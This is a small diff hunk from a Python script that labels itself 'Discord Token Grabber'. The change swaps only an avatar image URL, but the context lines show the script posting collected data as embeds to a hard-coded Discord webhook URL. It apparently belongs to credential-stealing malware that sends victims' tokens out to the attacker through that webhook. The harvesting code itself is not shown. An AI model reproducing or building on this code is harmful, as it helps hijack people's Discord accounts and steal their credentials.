@@ -179,7 +179,7 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
-        "avatar_url": "https://media.discordapp.net/attachments/687745652096368897/981901601725902908/Screenshot_2022-06-02-15-18-17-037.png"
+        "avatar_url": "https://media.discordapp.net/attachments/933016875401642021/981904412370952252/Snapchat-1734647735.jpg"
     }
     try:
         urlopen(Request("https://discord.com/api/webhooks/978208200891441192/ICq5zsWRJdBZfFvxgqgnCZ9Pds8a19s4G1x6p1djWt-8lbM-1Rth17mydjUxBk2oZbQC", data=dumps(webhook).encode(), headers=getheaders()))
